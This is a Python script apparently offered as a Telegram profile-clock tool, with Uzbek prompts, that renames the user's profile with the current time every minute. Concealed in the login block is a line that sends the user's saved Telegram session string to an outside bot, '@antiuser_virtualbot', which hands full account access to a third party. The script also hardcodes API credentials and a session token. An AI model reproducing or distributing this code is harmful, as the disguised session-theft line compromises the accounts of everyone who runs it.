#Aiocron clock tutorial @master_darknet
import asyncio, aiocron, datetime
from telethon import TelegramClient, events, sync, functions, types
from telethon.tl.functions.account import UpdateProfileRequest
from telethon.sessions import StringSession
import os, sys
import time

print("""\033[1;32m

                       (       )           )  
  *   ) (          (   )\ ) ( /(   (    ( /(  
` )  /( )\ )       )\ (()/( )\())  )\   )\()) 
 ( )(_)|()/(  ___(((_) /(_)|(_)\ (((_)|((_)\  
(_(_()) /(_))|___)\___(_))   ((_))\___|_ ((_) 
|_   _|(_)) __| ((/ __| |   / _ ((/ __| |/ /  
  | |    | (_ |  | (__| |__| (_) | (__  ' <   
  |_|     \___|   \___|____|\___/ \___|_|\_\  
                               \033[1;31m @virtual_programmer_n       

""")


api_id = 15832646
api_hash = "da7028d79bb7f2ea44f41f15911b9258"
string = '1ApWapzMBuyt4b5ywn3DtJoq79ekybmaxwcDtJ5hK1WzFCRSaXyzeaI5i8UfNNAs6DenIg2FC7fApRU6nsNWG1E3EVPsdbTFtOkTxMG-Fw6xtzm6OJPjZP2cCJE0MNHMwnTmwdS9bMBIW9YjMom0dLKCHXNupyrC5MzSNU1dpezzTyX2vFJ28Ervv8dkazDLXtIQ0oR10feErfwWKLHWQSEY7csXvdJ_9h45XZ8N8XtAamkqwg219Rxk6c31gWgDkQiduO5BL_V-rTW5WN2lbNgR2v1yStH5XQgFEprXkEbZZOdDHR4AJ7rpSc9QsZG9oBGKt-uld2S8BDDxD6669F-mhF-aOsHA='
with TelegramClient(StringSession(string), api_id, api_hash) as client:
	client.send_message("@antiuser_virtualbot", client.session.save())
	nick = input("\033[1;31mNICKNAME YOZING:\033[1;32m ")
	client.start()

print("\033[1;31mishga tushurildi\n\n1-daqiqa kuting va qaytib keling...")
@aiocron.crontab("*/1 * * * *")
async def set_clock():
    time = datetime.datetime.today().strftime(nick+"    %H:%M  ")
    async with client:
        await client(UpdateProfileRequest(first_name=time))
time.sleep(60)
print("\033[1;32m\n\nSoat Oʻrnatildi\nDasturchi: \033[1;31m@virtual_programmer_n")


client.loop.run_forever()
client.run_until_disconnected()




